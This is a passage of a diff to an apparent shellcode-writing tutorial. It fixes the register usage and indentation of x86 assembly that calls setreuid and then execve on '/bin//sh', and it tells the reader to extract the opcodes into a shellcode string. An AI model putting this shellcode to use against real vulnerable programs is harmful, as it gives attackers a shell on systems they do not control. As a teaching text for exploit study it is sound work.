@@ -85,23 +85,23 @@ section .text
 global _start
 
 _start:
-        push   0x46
-        pop    eax
-        mov    bx, 0x4b7
-        mov    cx, 0x453
-        int    0x80
+	push   0x46
+	pop    eax
+	mov    bx, 0x4b7
+	mov    cx, 0x453
+	int    0x80
 
-        xor    edx, edx
-        push   0xb
-        pop    eax
-        push   edx
-        push   0x68732f2f
-        push   0x6e69622f
-        mov    bx, esp
-        push   edx
-        push   ebx
-        mov    cx, esp
-        int    0x80
+	xor    edx, edx
+	push   0xb
+	pop    eax
+	push   edx
+	push   0x68732f2f
+	push   0x6e69622f
+	mov    ebx, esp
+	push   edx
+	push   ebx
+	mov    ecx, esp
+	int    0x80
 ```
 
 Now create the object, make ELF executable, takes the opcodes from objdump and get the shellcode string via [this online disassembly tool](https://defuse.ca/online-x86-assembler.htm#disassembly2):
